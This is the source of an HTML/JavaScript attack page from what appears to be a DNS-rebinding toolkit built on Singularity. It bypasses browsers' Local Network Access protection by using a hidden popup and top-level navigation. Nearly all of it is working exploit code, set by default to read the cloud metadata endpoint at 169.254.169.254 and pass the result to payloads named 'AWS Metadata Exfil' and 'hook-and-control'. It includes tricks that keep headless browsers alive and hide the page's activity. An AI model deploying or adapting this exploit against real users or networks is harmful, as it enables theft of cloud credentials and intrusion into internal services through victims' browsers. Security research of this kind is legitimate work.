<!doctype html>
<html lang="en">
<!--
    LNA Navigation Bypass — DNS rebinding via Singularity + window.open.

    Integrates with Singularity's DNS server using the same subdomain
    encoding and CONFIG as amaze.html. Uses window.open + navigation to
    bypass Chrome/Firefox Local Network Access (LNA) restrictions.

    Flow:
      1. Page redirects itself to the encoded attack subdomain
         (s-ATTACKERIP-TARGETIP-RAND-STRATEGY-e.domain:port)
      2. On click, opens a popup on the same origin (now the attack subdomain)
      3. Polls fetch("/") — succeeds while DNS points to attacker IP
      4. Singularity flips DNS to target IP → LNA blocks fetch → TypeError
      5. Navigates popup to CONFIG.targetPath via top-level navigation (not
         blocked by LNA)
      6. Reads popup.document.documentElement.outerHTML (same-origin)
      7. Dispatches response body to the configured payload

    Strategy compatibility:
      - 'fs' (recommended): deterministic flip after one DNS cache cycle (~60s)
      - 'rr': works but may need 2+ cycles if cache expiry hits attacker round
      - 'rd': unreliable — 50% chance initial redirect gets target IP
      - 'ma': does not work — both IPs always present, no clean DNS flip

    See WIKI.md for full write-up.
-->
<head>
    <title>LNA Bypass</title>
    <meta charset="utf-8">
    <meta http-equiv="x-dns-prefetch-control" content="off">
    <style>
        body {
            font: 14px/1.6 monospace;
            max-width: 48rem;
            margin: 2rem auto;
            padding: 0 1rem;
            background: #1a1a2e;
            color: #c8c8d4;
        }
        h3 { color: #e94560; margin-bottom: 0.5rem; }
        #status {
            background: #16213e;
            border: 1px solid #0f3460;
            padding: 1rem;
            margin: 1rem 0;
            white-space: pre-wrap;
            word-break: break-all;
            min-height: 8rem;
            max-height: 24rem;
            overflow-y: auto;
        }
        #msg {
            font-size: 1.2rem;
            color: #e94560;
            cursor: pointer;
            padding: 0.8rem;
            background: #16213e;
            border: 1px solid #0f3460;
            text-align: center;
            user-select: none;
        }
        #msg.waiting { color: #f5a623; cursor: default; }
        #msg.success { color: #53d769; cursor: default; }
        .dim { color: #666; }
    </style>
</head>
<body>
    <h3>LNA Navigation Bypass</h3>
    <p class="dim">DNS rebinding via Singularity + window.open — bypasses LNA.</p>

    <p id="msg">Click to start</p>

    <div id="status"></div>

    <!--
      delayDOMLoad: /delaydomload is a Singularity server endpoint that hangs
      the connection forever. Keeps headless browsers alive past document.load.
      Removed at runtime if CONFIG.delayDOMLoad is false.
    -->
    <iframe id="delaydomloadframe" src="/delaydomload" style="display: none"></iframe>

    <!-- payload.js provides: Registry, sooFetch, httpHeaderstoText -->
    <script src="payload.js"></script>
    <!-- payload scripts register into Registry -->
    <script src="payloads/aws-metadata-exfil.js"></script>
    <script src="payloads/hook-and-control.js"></script>
    <script src="payloads/lna-dom-scraper.js"></script>

    <script>
    // ============================================================
    //  CONFIG  —  edit these to retarget the attack
    //  Same fields as amaze.html.
    // ============================================================
    const CONFIG = {
        // Attacker infrastructure
        attackHostIPAddress: 'xx.xx.xx.xx',
        attackHostDomain:    'dynamic.your.domain',

        // Target — single source of truth
        targetHostIPAddress: '169.254.169.254',
        targetPort:          '80',
        targetPath:          '/latest/meta-data',

        // Rebinding strategy (encoded in Singularity subdomain)
        //   'fs'  — RECOMMENDED. First query → attacker, all subsequent → target.
        //           Deterministic. One DNS cache cycle (~60s) then LNA blocks fetch.
        //   'rr'  — Round-robin. Alternates attacker/target per query. Works but
        //           may take 2+ cache cycles (~120s+) if expiry lands on attacker round.
        //   'rd'  — Random. 50/50 each query. Initial redirect may get target IP,
        //           breaking the flow. NOT RECOMMENDED for LNA bypass.
        //   'ma'  — Multiple answers (both IPs). Browser picks one and may never
        //           switch. DOES NOT WORK for LNA bypass.
        rebindingStrategy:   'fs',
        interval:            '20',     // seconds between fetch polls (~3 polls per DNS cache cycle)

        // Payload — must match a key registered in payloads/*.js
        attackPayload:       'AWS Metadata Exfil',

        // Misc
        wsProxyPort:         3129,
        flushDns:            false,
        delayDOMLoad:        true,
        hideActivity:        false,
    };

    // ============================================================
    //  Singularity subdomain URL builder (same as amaze.html)
    // ============================================================
    const HOST_URL_TEMPLATE = "http://s-%1-%2-%3-%4-e.%5:%6/%7";

    const buildAttackUrl = (path) => HOST_URL_TEMPLATE
        .replace("%1", CONFIG.attackHostIPAddress)
        .replace("%2", CONFIG.targetHostIPAddress.replace(/-/g, '--'))
        .replace("%3", Math.floor(Math.random() * 2 ** 32))
        .replace("%4", CONFIG.rebindingStrategy)
        .replace("%5", CONFIG.attackHostDomain)
        .replace("%6", CONFIG.targetPort)
        .replace("%7", path || '');

    const joinUrl = (base, path) =>
        base.replace(/\/+$/, '') + '/' + path.replace(/^\/+/, '');

    // ============================================================
    //  UI helpers
    // ============================================================
    const log = (line) => {
        const el = document.getElementById('status');
        const ts = new Date().toISOString().slice(11, 19);
        el.textContent += '[' + ts + '] ' + line + '\n';
        el.scrollTop = el.scrollHeight;
    };

    const msgEl = document.getElementById('msg');

    // ============================================================
    //  delayDOMLoad / hideActivity
    // ============================================================
    if (CONFIG.delayDOMLoad !== true) {
        const d = document.getElementById('delaydomloadframe');
        d.parentNode.removeChild(d);
    }
    if (CONFIG.hideActivity) document.body.style.display = 'none';

    // ============================================================
    //  Attack subdomain redirect
    //
    //  For same-origin popup access to work, this page must be
    //  loaded on the Singularity attack subdomain. If it isn't,
    //  redirect there. The encoded subdomain tells Singularity's
    //  DNS which IPs to serve (attacker first, then target).
    // ============================================================
    const ATTACK_SUBDOMAIN_RE = /^s-.+-e\./;
    const onAttackSubdomain = ATTACK_SUBDOMAIN_RE.test(window.location.hostname);

    if (!onAttackSubdomain) {
        const redirectUrl = buildAttackUrl('lna-bypass.html');
        log('Redirecting to attack subdomain...');
        log(redirectUrl);
        window.location = redirectUrl;
    }

    // ============================================================
    //  Attack flow (runs only on the attack subdomain)
    // ============================================================
    if (onAttackSubdomain) {
        log('On attack subdomain: ' + window.location.hostname);
        log('Target: ' + CONFIG.targetHostIPAddress + ':' + CONFIG.targetPort + CONFIG.targetPath);
        log('Strategy: ' + CONFIG.rebindingStrategy + ', interval: ' + CONFIG.interval + 's');
        log('Payload: ' + CONFIG.attackPayload);
        log('Click to start the attack.');

        msgEl.onclick = async () => {
            msgEl.onclick = null;
            msgEl.className = 'waiting';
            msgEl.innerText = 'Waiting for DNS rebind...';

            // Step 1: open popup on same origin (attacker IP right now)
            const popup = window.open(
                '/',
                'lna_popup',
                'width=1,height=1,top=9999,left=9999'
            );

            if (!popup) {
                log('ERROR: popup blocked. Needs user gesture or allow-popups.');
                msgEl.innerText = 'Popup blocked — try again';
                msgEl.className = '';
                msgEl.onclick = arguments.callee;
                return;
            }

            log('Popup opened on attacker origin');

            // Step 2: poll fetch("/") to detect when Singularity flips DNS
            // While DNS points to attacker IP, fetch succeeds.
            // After DNS flips to target IP, LNA blocks fetch → TypeError.
            //
            // With 'fs': one DNS cache cycle (~60s), then target IP on all queries.
            // With 'rr': may take multiple cache cycles if expiry hits attacker round.
            log('Strategy: ' + CONFIG.rebindingStrategy);
            log('Polling fetch("/") every ' + CONFIG.interval + 's to detect LNA block...');
            if (CONFIG.rebindingStrategy === 'rr') {
                log('Round-robin may need multiple DNS cache cycles (~120s+)...');
            } else {
                log('Waiting for browser DNS cache to expire (~60s)...');
            }

            const pollMs = parseInt(CONFIG.interval) * 1000;
            let rebindDetected = false;
            let polls = 0;

            while (!rebindDetected) {
                try {
                    await fetch('/', { cache: 'reload' });
                    polls++;
                    if (polls % 5 === 0) {
                        const elapsed = Math.round(polls * pollMs / 1000);
                        log('Still on attacker IP (' + polls + ' polls, ~' + elapsed + 's)...');
                    }
                } catch (e) {
                    rebindDetected = true;
                    const elapsed = Math.round(polls * pollMs / 1000);
                    log('LNA block after ' + polls + ' polls (~' + elapsed + 's) — rebind detected!');
                }
                if (!rebindDetected) {
                    await new Promise(r => setTimeout(r, pollMs));
                }
            }

            // Step 3: navigate popup to targetPath on the rebound origin.
            // Top-level navigation is NOT guarded by LNA.
            const navPath = joinUrl('/', CONFIG.targetPath);
            log('Navigating popup to ' + navPath + ' via top-level navigation...');
            popup.location = navPath;

            msgEl.innerText = 'Rebind successful — reading target...';
            msgEl.className = 'success';

            // Step 4: wait for navigation to complete, then read popup DOM.
            // Same-origin read works because the browser still considers the
            // popup same-origin (same scheme+host+port as the opener).
            const readPopup = (attempt) => {
                try {
                    const doc = popup.document;
                    const body = doc.documentElement.outerHTML;
                    if (!body || body.length === 0) throw new Error('empty response');
                    return body;
                } catch (e) {
                    if (attempt > 0) throw e;
                    return null;
                }
            };

            await new Promise(r => setTimeout(r, 2000));

            let body = null;
            try {
                body = readPopup(0);
                if (!body) {
                    log('First read empty, retrying in 3s...');
                    await new Promise(r => setTimeout(r, 3000));
                    body = readPopup(1);
                }
            } catch (e) {
                log('Read failed: ' + e);
                log('Retrying in 5s...');
                await new Promise(r => setTimeout(r, 5000));
                try {
                    body = readPopup(1);
                } catch (e2) {
                    log('Retry failed: ' + e2);
                    log('Target may require more load time or rebind timing was off.');
                    return;
                }
            }

            log('Read ' + body.length + ' bytes from rebound target');
            console.log('[+] rebind success — response:\n' + body);

            // Step 5: dispatch to the configured payload.
            // Expose the popup reference so payloads (e.g. LNA DOM Scraper)
            // can navigate it to crawl additional pages.
            window.__lnaPopup = popup;

            const payloadObj = Registry[CONFIG.attackPayload];
            if (payloadObj) {
                log('Dispatching to payload: ' + CONFIG.attackPayload);
                payloadObj.attack(null, document.cookie, body, CONFIG.wsProxyPort);
            } else {
                log("WARNING: payload '" + CONFIG.attackPayload + "' not found in Registry");
                log('Available: ' + Object.keys(Registry).join(', '));
                log('Response logged to console only.');
            }
        };
    }
    </script>
</body>
</html>
